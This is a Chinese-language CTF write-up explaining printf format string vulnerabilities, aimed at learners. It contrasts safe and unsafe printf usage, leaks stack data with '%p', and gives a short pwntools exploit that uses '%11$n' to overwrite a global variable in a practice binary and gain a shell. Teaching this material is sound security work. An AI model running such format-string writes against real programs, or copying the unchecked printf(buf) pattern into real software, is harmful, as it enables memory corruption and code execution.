内容不是很难主要是自己对于格式化字符串漏洞的利用还是有点一知半解做题的时候突然来了灵感就正好记录一下方便理解。

## 前置知识：

###
printf函数![printf函数](https://image.3001.net/images/20211103/1635951533_6182a3ad7e7a3768f3d71.png!small)

### 声明

    
    
    int printf(const char *format, ...)
    

**format** \-- 这是字符串，包含了要被写入到标准输出 stdout 的文本。

format 标签属性是`%[flags][width][.precision][length]specifier`

 **正常的写法**

    
    
    char str[10];
    scanf("%s",str);
    printf("%s",str);
    

**有问题的写法**

    
    
    char str[10];
    scanf("%s",str);
    printf(str);
    

我们可以发现这个时候str参数的值是可控的而第一种写法我们是不可控的。

这里可以拿我做的这道简单的格式化字符串漏洞的题目做例子：![例子](https://image.3001.net/images/20211103/1635951566_6182a3ceecb094774553e.png!small)

read函数读取字符到buf里，也就是说这个buf的参数我们是可以控制的。

再往后看read函数下面`printf(buf)`输出buf内的值，由于buf参数的值我们可控，那我们输入格式化字符到buf里会怎么样？

我们构造如下代码进行调试。

    
    
    # -*- coding: UTF-8 -*-    #by 小渔xiaoyu
    from pwn import*
    context(os='linux', arch='i386', log_level='debug')
    elf = ELF('./fm')
    sh = elf.process()
    gdb.attach(sh,'b printf')
    sh.send('%p')#发送一个格式化字符串让read函数读取
    sh.interactive()
    

![调试1](https://image.3001.net/images/20211103/1635951591_6182a3e75effbc1f529b8.png!small)

我们控制了format参数，让参数的值变成`%p`。

`%p：输出16进制数据`

![调试3](https://image.3001.net/images/20211103/1635951640_6182a418318e45652100d.png!small)

![读取数据](https://image.3001.net/images/20211103/1635951668_6182a4342a0405761c723.png!small)

我们看到5所指的地址也就是我们输入的格式化字符`%p`所对应的地址被输出了出来，忽略`3！`。

主要还是我们错误的写法导致format参数可控，我们输入的格式化字符被程序当做格式化字符解析输出。

有点像sql注入，传入的参数可控，当mysql语句被当做参数传入后被执行造成sql注入那就可以读取数据库数据。

而格式化字符串漏洞可以越界读取数据等等。![计算偏移](https://image.3001.net/images/20211103/1635951877_6182a505a8d5d42b68618.png!small)

我们利用fmtarg计算出format的偏移，而`0xfff3e05c`就是format在栈上的地址。

到此我们大概了解了格式化字符串漏洞越界数据。

回到例题上：

![回到例题](https://image.3001.net/images/20211103/1635951712_6182a460e0065941901c5.png!small)

由于存在格式化字符串漏洞我们可以利用其特性对x所在的地址进行数据写入让x=4那样我们就可以成功getshell。

在ida
pro里我们可以直接找到x的地址`0x804A02C`。![x地址](https://image.3001.net/images/20211103/1635951734_6182a476384216cefeea0.png!small)

既然思路有了那就可以构造exp去修改`0x804A02C`地址上的值，这里我们利用格式化字符`%n`去修改这个地址上的值。

%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置。

## 漏洞利用

    
    
    # -*- coding: UTF-8 -*-    #by 小渔xiaoyu
    from pwn import*
    context(os='linux', arch='i386', log_level='debug')
    elf = ELF('./fm')
    sh = elf.process()
    x_addr = 0x0804A02C
    sh.send(p32(x_addr)+"%11$n")#传入x的地址然后x的地址被存放在栈偏移11的位置，然后往这个位置写入数据。
    sh.interactive()
    

我们注意到我们的poc并没有出现参数4?其实也很好解释，我们回看格式化字符`%n`的特性，它实际上写入的数据是`%n`前面参数的长度。

实际上也就是`%11$n`前面参数的长度也就是我们前面传入的x的地址长度正好就是4位，这样就解释通了。最后x的值被修改成x地址的长度(4位)也就是x的值被改成了4那么后面的判断自然就绕过去了，成功getshell。![getshell](https://image.3001.net/images/20211103/1635951755_6182a48b899c93d311fca.png!small)

